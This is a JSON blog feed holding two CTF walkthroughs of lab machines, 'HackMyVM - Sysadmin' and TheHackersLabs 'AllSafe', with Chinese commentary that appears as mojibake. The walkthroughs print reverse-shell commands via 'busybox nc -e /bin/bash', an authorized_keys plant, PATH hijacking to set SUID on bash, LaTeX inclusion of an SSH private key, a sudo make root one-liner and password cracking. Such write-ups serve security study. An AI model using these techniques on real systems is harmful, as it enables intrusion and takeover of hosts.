{
    "version": "https://jsonfeed.org/version/1",
    "title": "Sunset Blog",
    "home_page_url": "https://www.sunsetaction.top",
    "feed_url": "https://www.sunsetaction.top/feed.json",
    "description": "Sunsetçš„ä¸ªäººåšå®¢ï¼Œè®°å½•ç”Ÿæ´»å­¦ä¹ ç‚¹æ»´ã€‚åˆ†äº«ç½‘ç»œå®‰å…¨ã€æ¸—é€æµ‹è¯•ã€CTF writeupã€æŠ€æœ¯æ–‡ç« ç­‰å†…å®¹ã€‚",
    "icon": "https://www.sunsetaction.top/images/logo.png",
    "author": {
        "name": "Sunset",
        "url": "https://www.sunsetaction.top/about"
    },
    "items": [
        {
            "id": "https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin",
            "content_html": "\n# Sysadmin.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Sysadmin\n> \n\n![image.png](/post-images/HackMyVMSysadmin/image.png)\n\n## Recon\n\n### PortScan\n\n```python\nâœ  ~ nmap -sT -min-rate 10000 -p- 192.168.56.210\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:08 CST\nNmap scan report for 192.168.56.210\nHost is up (0.00015s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.45 seconds\n```\n\n```python\nâœ  ~ nmap -sT -A -p 22,80 192.168.56.210        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 15:14 CST\nNmap scan report for 192.168.56.210\nHost is up (0.00049s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: C Code Upload\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:43:E8:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.50 ms 192.168.56.210\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 21.64 seconds\n```\n\n### æšä¸¾\n\n`80` ç«¯å£ï¼Œçœ‹æ ·å­æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æ˜¯è®©æˆ‘ä»¬ä¸Šä¼  `C` è¯­è¨€æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šè¿è¡Œ\n\n![image.png](/post-images/HackMyVMSysadmin/image1.png)\n\nç«¯å£æ‰«æ\n\n```python\nâœ  sysadmin feroxbuster --url http://192.168.56.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt\n\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.56.210\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [php, txt]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET       59l      156w     2384c http://192.168.56.210/index.php\n200      GET       59l      156w     2384c http://192.168.56.210/\n[####################] - 50s   661641/661641  0s      found:2       errors:1      \n[####################] - 50s   661635/661635  13173/s http://192.168.56.210/\n```\n\nF12 æŸ¥çœ‹æºç æ—¶å‘ç°\n\n```python\ngcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out\n```\n\n![image.png](/post-images/HackMyVMSysadmin/image2.png)\n\n## RCE\n\nè¿™é‡Œçš„çŒœæµ‹æ˜¯ï¼Œä¸Šä¼  c æ–‡ä»¶åï¼Œç„¶åé€šè¿‡ä¸Šè¾¹çš„è¯­å¥è¿›è¡Œç¼–è¯‘ç„¶åè¿è¡Œï¼Œä½†æ˜¯ç¼–è¯‘è¯­å¥ä¸­å¸¦æœ‰ `-nostdinc` ä¸ä½¿ç”¨é»˜è®¤ç³»ç»Ÿåº“å‡½æ•°åŠä¸æœç´¢é»˜è®¤å¤´æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥å¯¼å…¥ `stdio.h` ç­‰ï¼Œéœ€è¦ç»•è¿‡\n\né€šè¿‡ä½¿ç”¨å†…è”å‡½æ•°å®šä¹‰ï¼Œè¦åœ¨ä¸ä¾èµ– `stdlib.h` çš„æƒ…å†µä¸‹è°ƒç”¨ systemï¼Œæ‚¨å¯ä»¥æ‰‹åŠ¨å£°æ˜å®ƒï¼š\n\næµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨RCE\n\n```python\nint system(const char *command);\nint main() {\n    system(\"busybox nc 192.168.56.5 1234\"); // Attempt to spawn a shell\n    return 0;\n}\n```\n\nå­˜åœ¨ RCE\n\n![image.png](/post-images/HackMyVMSysadmin/image3.png)\n\nè¿›è¡Œåå¼¹ `shell`\n\n```python\nint system(const char *command);\nint main() {\n    system(\"busybox nc 192.168.56.5 1234 -e /bin/bash\"); // Attempt to spawn a shell\n    return 0;\n}\n```\n\nä½†æ˜¯è¿ä¸Šè¿ä¸Šä¸åˆ°ä¸€ä¼šå°±æ–­æ‰äº†\n\n![image.png](/post-images/HackMyVMSysadmin/image4.png)\n\nå°è¯•å†™å…¬é’¥ï¼Œé¦–å…ˆè·å–ç”¨æˆ·å\n\n```python\nint system(const char *command);\nint main() {\n    system(\"echo $(whoami) | busybox nc 192.168.56.5 80\");\n    return 0;\n}\n```\n\nå¾—åˆ°ç”¨æˆ·å `echo`\n\n![image.png](/post-images/HackMyVMSysadmin/image5.png)\n\nå†™å…¬é’¥\n\n```python\n# Kali\ncat ~/.ssh/authorized_keys >  authorized_keys\npython -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n\n```python\nint system(const char *command);\nint main() {\n    system(\"mkdir -p ~/.ssh && busybox wget 192.168.56.5/authorized_keys -O ~/.ssh/authorized_keys\");\n    return 0;\n}\n```\n\n![image.png](/post-images/HackMyVMSysadmin/image6.png)\n\né€šè¿‡ç§é’¥è¿›è¡Œç™»å½•\n\n![image.png](/post-images/HackMyVMSysadmin/image7.png)\n\nè¿›å»åèƒ½è¯» `user.txt`\n\n```python\necho@Sysadmin:~$ cat user.txt \nflag{user-9592f6e02a7abaf9e38c0ef43e868cf3}\n```\n\n## å‘½ä»¤åŠ«æŒ\n\næŸ¥çœ‹ `sudo` æƒé™\n\n```python\necho@Sysadmin:~$ sudo -l\nMatching Defaults entries for echo on Sysadmin:\n    !env_reset, mail_badpass, !env_reset, always_set_home\n\nUser echo may run the following commands on Sysadmin:\n    (root) NOPASSWD: /usr/local/bin/system-info.sh\n```\n\nå…¶ä¸­ `!env_reset` å¯èƒ½å­˜åœ¨è·¯å¾„åŠ«æŒ\n\næŸ¥çœ‹è„šæœ¬\n\n```python\necho@Sysadmin:~$ cat /usr/local/bin/system-info.sh\n#!/bin/bash\n\n#===================================\n# Daily System Info Report\n#===================================\n\necho \"Starting daily system information collection at $(date)\"\necho \"------------------------------------------------------\"\n\necho \"Checking disk usage...\"\ndf -h\n\necho \"Checking log directory...\"\nls -lh /var/log/\nfind /var/log/ -type f -name \"*.gz\" -mtime +30 -exec rm {} \\;\n\necho \"Checking critical services...\"\nsystemctl is-active sshd\nsystemctl is-active cron\n\necho \"Collecting CPU and memory information...\"\ncat /proc/cpuinfo\nfree -m\n\necho \"------------------------------------------------------\"\necho \"Report complete at $(date)\"\n```\n\nå¯ä»¥çœ‹åˆ°å¾ˆå¤šå¯ä»¥åŠ«æŒçš„å‘½ä»¤\n\n```python\necho@Sysadmin:~$ echo \"chmod +s /bin/bash\" > /tmp/df\necho@Sysadmin:~$ chmod +x /tmp/df\necho@Sysadmin:~$ export PATH=\"/tmp:$PATH\"\necho@Sysadmin:~$ sudo /usr/local/bin/system-info.sh\n```\n\n![image.png](/post-images/HackMyVMSysadmin/image8.png)",
            "url": "https://www.sunsetaction.top/2025/10/25/HackMyVMSysadmin",
            "title": "HackMyVM - Sysadmin",
            "summary": "Sysadmin. https://hackmyvm.eu/machines/machine.php?vm=Sysadmin Recon PortScan æšä¸¾ 80 ç«¯å£ï¼Œçœ‹æ ·å­æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”æ˜¯è®©æˆ‘ä»¬ä¸Šä¼  C è¯­è¨€æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šè¿è¡Œ ç«¯å£æ‰«æ F12 æŸ¥çœ‹æºç æ—¶å‘ç° RCE è¿™é‡Œçš„çŒœæµ‹æ˜¯ï¼Œä¸Šä¼  c...",
            "date_modified": "2025-10-25T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackMyVM",
                "Linux",
                "RCE",
                "Hijack",
                "Path_Hijack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe",
            "content_html": "\n# AllSafe\n\n> https://labs.thehackerslabs.com/machine/139\n> \n\n![image.png](/post-images/TheHackersLabsAllSafe/image.png)\n\n## Recon\n\n### PortScan\n\n```python\nâœ  AllSafe nmap -sT -min-rate 10000 -p- 192.168.56.130\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:38 CST\nNmap scan report for 192.168.56.130\nHost is up (0.00036s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n2222/tcp open  EtherNetIP-1\nMAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 18.73 seconds\n```\n\n```python\nâœ  AllSafe nmap -sT -A -p 22,80,2222 192.168.56.130       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 13:40 CST\nNmap scan report for 192.168.56.130\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n| ssh-hostkey: \n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.65 ((Debian))\n|_http-title: Allsafe\n|_http-server-header: Apache/2.4.65 (Debian)\n2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)\nMAC Address: 08:00:27:15:CB:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.56 ms 192.168.56.130\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 22.48 seconds\n```\n\n### æšä¸¾\n\n80 ç«¯å£ï¼ŒåŸŸåæ˜¯ `allsafe.thl`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image1.png)\n\nç›®å½•æ‰«æï¼Œæ‰«å‡ºæ¥çš„ä¸œè¥¿å¤ªå¤šå°±ä¸æ”¾å‡ºæ¥äº†ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå¯ä»¥çœ‹çš„\n\n![image.png](/post-images/TheHackersLabsAllSafe/image2.png)\n\nä¸»ç«™ä¸­è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥æäº¤ç½‘å€ï¼Œæ‰€ä»¥ç´¢æ€§æµ‹è¯•äº† SSRFï¼Œä½†æ˜¯æ²¡æœ‰è§¦å‘ï¼Œä½†æ˜¯æµ‹è¯• `localhost` çš„æ—¶å€™è¿”å›äº† `1234565even`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image3.png)\n\nåé¢æ²¡æ‰¾åˆ°å…¶ä»–çš„ä¸œè¥¿\n\nå°è¯•å­åŸŸåçˆ†ç ´\n\n```python\nâœ  AllSafe ffuf -u 'http://allsafe.thl/' -H 'host:FUZZ.allsafe.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 7016\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://allsafe.thl/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.allsafe.thl\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 7016\n________________________________________________\n\nintranet                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 12ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 699 req/sec :: Duration: [0:01:57] :: Errors: 0 ::\n```\n\nå¾—åˆ°å­åŸŸå `intranet` ï¼Œè®¿é—®ï¼Œç™»å½•éœ€è¦å‘˜å·¥ ID æ ¼å¼ä¸º `x-xxx-xxxx` ï¼Œå¯†ç ä¼°è®¡å°±æ˜¯ä¸Šè¾¹çš„å¾—åˆ°çš„ `123456Seven`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image4.png)\n\nè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œç›®å½•çˆ†ç ´\n\n```python\nâœ  AllSafe gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://intranet.allsafe.thl/                    \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://intranet.allsafe.thl/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 302) [Size: 0] [--> login.php]\n/images               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/images/]\n/login.php            (Status: 200) [Size: 2075]\n/docs                 (Status: 301) [Size: 327] [--> http://intranet.allsafe.thl/docs/]\n/profile.php          (Status: 200) [Size: 2305]\n/assets               (Status: 301) [Size: 329] [--> http://intranet.allsafe.thl/assets/]\n/customers.php        (Status: 200) [Size: 11072]\n/db.php               (Status: 200) [Size: 0]\n/logout.php           (Status: 302) [Size: 0] [--> login.php]\n/process              (Status: 301) [Size: 330] [--> http://intranet.allsafe.thl/process/]\n/views                (Status: 301) [Size: 328] [--> http://intranet.allsafe.thl/views/]\n```\n\nçœ‹åˆ°æœ‰ `customers.php` ï¼Œè¿›è¡ŒæŸ¥çœ‹ï¼Œå¾—åˆ°å¾ˆå¤šçš„å‘˜å·¥ä¿¡æ¯ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å‘˜å·¥ ID\n\n![image.png](/post-images/TheHackersLabsAllSafe/image5.png)\n\næœ€ååœ¨ä¸»ç«™çš„ â€œæˆ‘ä»¬çš„å›¢é˜Ÿâ€ ä¸­æ‰¾åˆ°äº†ç±»ä¼¼å‘˜å·¥ ID çš„ä¸œè¥¿\n\n![image.png](/post-images/TheHackersLabsAllSafe/image6.png)\n\n`0-477-9990`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image7.png)\n\næµ‹è¯•ç™»å½• `0-477-9990`:`123456Seven` \n\næˆåŠŸè¿›å…¥åå°\n\n![image.png](/post-images/TheHackersLabsAllSafe/image8.png)\n\n## åå°åˆ©ç”¨\n\n### ä¿¡æ¯æ”¶é›†\n\nåå°å°è¯•å¯»æ‰¾å¯åˆ©ç”¨çš„ç‚¹\n\nç‚¹å‡» `Contrato` å¯ä»¥æŸ¥çœ‹åˆåŒ\n\n![image.png](/post-images/TheHackersLabsAllSafe/image9.png)\n\nå½“å‰åœ¨ `process` ç›®å½•ä¸­\n\n![image.png](/post-images/TheHackersLabsAllSafe/image10.png)\n\nåœ¨å…¶ä¸­çš„ä¸€ä¸ªæ–‡æ¡£ä¸­è¿˜èƒ½ç¿»åˆ° `/etc/passwd` çš„è¾“å‡º\n\n![image.png](/post-images/TheHackersLabsAllSafe/image11.png)\n\næŸ¥çœ‹å…¶ tex æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ° `Empresa` å‚æ•°å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«\n\n![image.png](/post-images/TheHackersLabsAllSafe/image12.png)\n\nå…¶ä¸­è¿˜æœ‰ä¸€ä¸ªè¯»å–äº† `SSH` ç§é’¥çš„\n\n![image.png](/post-images/TheHackersLabsAllSafe/image13.png)\n\næŸ¥çœ‹åˆ°è¯»å–çš„æ˜¯ `/home/parker/.ssh/id_rsa`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image14.png)\n\n### ä»»æ„æ–‡ä»¶è¯»å–\n\nå°† `PDF` ä¸Šçš„ `id_rsa` è¿›è¡Œä¿®å¤\n\n```python\n# å‡è®¾æ–‡ä»¶æ˜¯ key.txt\ncat id_rsa | grep -v \"PRIVATE KEY\" | tr -d ' \\n' | fold -w 70 > fixed_key_body.txt\n# ç„¶ååŠ ä¸Šå¤´å°¾\necho \"-----BEGIN OPENSSH PRIVATE KEY-----\" > fixed_key.txt\ncat fixed_key_body.txt >> fixed_key.txt\necho \"-----END OPENSSH PRIVATE KEY-----\" >> fixed_key.txt\n```\n\nä½†æ˜¯è²Œä¼¼ä¸èµ·æ•ˆ\n\n```python\nâœ  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222\nparker@192.168.56.130's password: \n```\n\né‡æ–°è¯»å–ä¸€ä¸‹ `id_rsa`ï¼Œå’Œä¸Šè¾¹ä¸€æ ·è¿›è¡ŒåŒ…å«å³å¯\n\n```python\n\\lstinputlisting{/home/parker/.ssh/id_rsa}\n```\n\n![image.png](/post-images/TheHackersLabsAllSafe/image15.png)\n\n![image.png](/post-images/TheHackersLabsAllSafe/image16.png)\n\nå†å’Œä¸Šè¾¹ä¸€æ ·ä¿®å¤ä¸€æ¬¡åè¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•\n\n```python\nâœ  AllSafe ssh parker@192.168.56.130 -i fixed_key.txt -p 2222\nparker@153504fd9bcb:~$ \n```\n\n## æ¨ªå‘ç§»åŠ¨ - å®¹å™¨é€ƒé€¸\n\n### to goddard\n\nè¿›æ¥åæˆ‘ä»¬æ˜¯åœ¨å®¹å™¨é‡Œé¢\n\n```python\nparker@153504fd9bcb:~$ ls -al /\ntotal 68\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 .\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 ..\n-rwxr-xr-x   1 root root    0 Oct 11 18:41 .dockerenv\nlrwxrwxrwx   1 root root    7 May 12 19:25 bin -> usr/bin\ndrwxr-xr-x   2 root root 4096 May 12 19:25 boot\ndrwxr-xr-x   5 root root  340 Oct 21 04:28 dev\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 etc\ndrwxr-xr-x   1 root root 4096 Aug 24 18:39 home\nlrwxrwxrwx   1 root root    7 May 12 19:25 lib -> usr/lib\nlrwxrwxrwx   1 root root    9 May 12 19:25 lib64 -> usr/lib64\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 media\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 mnt\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 opt\ndr-xr-xr-x 149 root root    0 Oct 21 04:28 proc\ndrwx------   1 root root 4096 Aug 24 18:39 root\ndrwxr-xr-x   1 root root 4096 Oct 11 18:41 run\nlrwxrwxrwx   1 root root    8 May 12 19:25 sbin -> usr/sbin\ndrwxr-xr-x   2 root root 4096 Aug 11 00:00 srv\ndr-xr-xr-x  13 root root    0 Oct 21 04:28 sys\ndrwxrwxrwt   1 root root 4096 Oct 21 06:23 tmp\ndrwxr-xr-x   1 root root 4096 Aug 11 00:00 usr\ndrwxr-xr-x   1 root root 4096 Aug 12 22:31 var\n```\n\næ•°æ®åº“å¯†ç ï¼Œä½†æ˜¯è¿ä¸ä¸Š\n\n```python\nparker@153504fd9bcb:/var/www/intranet$ cat db.php \n<?php\n\n$dsn = \"mysql:host=db;dbname=allsafe;charset=utf8\";\n$username = \"root\";\n$password = \"31jB2rcbG1Pjorbd93eaxHW\";\n\ntry {\n    $pdo = new PDO($dsn, $username,  $password);\n    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n} catch (PDOExecption) {\n    die(\"Connection failed: \" . $e->getMessage());\n}\n```\n\n`mail` é‡Œé¢æœ‰ä¸œè¥¿\n\n```python\nparker@153504fd9bcb:/var/mail/parker$ cat meeting \nFrom goddard@localhost Thu Aug 21 14:05:20 2025\nDate: Thu, 21 Aug 2025 14:05:20 +0000\nFrom: goddard@localhost\nTo: parker@localhost\nSubject: ReuniÃ³n con E-Corp\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"BOUNDARY\"\n\n--BOUNDARY\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nHola Oliver,\n\nTe adjunto las notas que armÃ© para la reuniÃ³n con el cliente.  \nRevisalo y confirmame si llegamos con todo.\n\nSaludos,  \nGideon\n\n--BOUNDARY\nContent-Type: text/plain; name=\"meeting_notes.txt\"\nContent-Disposition: attachment; filename=\"meeting_notes.txt\"\nContent-Transfer-Encoding: 7bit\n\nMeeting Notes - E-Corp\n----------------------\n1. Confirmar agenda con el cliente.\n2. Revisar documentaciÃ³n tÃ©cnica.\n3. Validar acceso al portal con la credencial:\n\n   Clave de acceso: 6D7033386E71556654416130494D314F70306157\n\n4. Preparar demo corta del servicio.\n--BOUNDARY--\nEOF.\n```\n\nå…¶ä¸­å‘Šè¯‰æˆ‘ä»¬è¿™æ˜¯ä¸€ä¸ªç§˜é’¥ `6D7033386E71556654416130494D314F70306157`\n\nå…¸å‹ 16 è¿›åˆ¶ç¼–ç ï¼Œè§£å‡ºæ¥æ˜¯ `mp38nqUfTAa0IM1Op0aW`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image17.png)\n\nè¯¥å¯†ç æ˜¯ç”¨æˆ· `goddard` çš„å¯†ç \n\n```python\nparker@153504fd9bcb:/var/mail/parker$ su goddard\nPassword: \ngoddard@153504fd9bcb:/var/mail/parker$ \n```\n\n### to root\n\næŸ¥çœ‹ sudo æƒé™\n\n```python\ngoddard@153504fd9bcb:/var/mail/parker$ sudo -l\nMatching Defaults entries for goddard on 153504fd9bcb:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser goddard may run the following commands on 153504fd9bcb:\n    (ALL) NOPASSWD: /usr/bin/make\n```\n\nç›´æ¥ææƒåˆ° `root`\n\n```python\ngoddard@153504fd9bcb:/var/mail/parker$ COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n# \n# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n### to cisco\n\nå®¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ª `psafe3` æ–‡ä»¶\n\n```python\n# ls\nsecrets.psafe3\n```\n\n`PSAFE3` æ–‡ä»¶å¤§å¤šå±äº `Password Safe`ã€‚ `Password Safe` å¯è®©æ‚¨å®‰å…¨è½»æ¾åœ°åˆ›å»ºå®‰å…¨åŠ å¯†çš„ç”¨æˆ·å/å¯†ç åˆ—è¡¨ã€‚\n\nå› ä¸ºéœ€è¦å¯†ç æ‰èƒ½æ‰“å¼€ï¼Œæˆ‘ä»¬é€šè¿‡ `john` è¿›è¡Œçˆ†ç ´\n\n```python\nâœ  AllSafe pwsafe2john secrets.psafe3 > hash\n\nâœ  AllSafe john --wordlist=/usr/share/wordlists/rockyou.txt hash \nUsing default input encoding: UTF-8\nLoaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])\nCost 1 (iteration count) is 262144 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrockandroll      (secret)     \n1g 0:00:00:43 DONE (2025-10-21 15:51) 0.02321g/s 190.2p/s 190.2c/s 190.2C/s 123456..whitetiger\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\nå¾—åˆ°å¯†ç  `rockandroll`\n\næ–‡ä»¶é€šè¿‡ `password safe` æ‰“å¼€\n\n![image.png](/post-images/TheHackersLabsAllSafe/image18.png)\n\n```python\nsMpam!xxxxxxxxxxxxxxxxxx\n```\n\n![image.png](/post-images/TheHackersLabsAllSafe/image19.png)\n\n## ææƒ\n\n### ä¿¡æ¯æ”¶é›†\n\nå½“å‰ç›®å½•æ–‡ä»¶\n\n```python\ncisco@allsafe:~$ ls\ndarkarmy.bin  user.txt\n```\n\nå®¶ç›®å½•ä¸‹èƒ½è¯»å– user.txt\n\n```python\ncisco@allsafe:~$ cat user.txt \ne8xxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\ndarkarmy.bin\n\n```python\ncisco@allsafe:~$ strings darkarmy.bin \n70617373776f72643d64726b32303235210a\n```\n\nè¿˜æ˜¯ HEX ï¼Œèƒ½å¾—åˆ°ä¸€ä¸ªå¯†ç  `drk2025!`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image20.png)\n\nå®¶ç›®å½•ä¸‹éšè—æ–‡ä»¶ `.unknow`\n\n```python\ncisco@allsafe:~$ cat .unknown\nSi quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.\nA partir de ahora, todo contacto serÃ¡ Ãºnicamente a travÃ©s del canal seguro.\n\nConÃ©ctate al servidor de mensajerÃ­a y entra en la sala:\n    dark-ops\n\nNo intentes usar este acceso para nada mÃ¡s que lo acordado.\nNosotros decidimos cuÃ¡ndo y cÃ³mo se conversa.\n```\n\n> 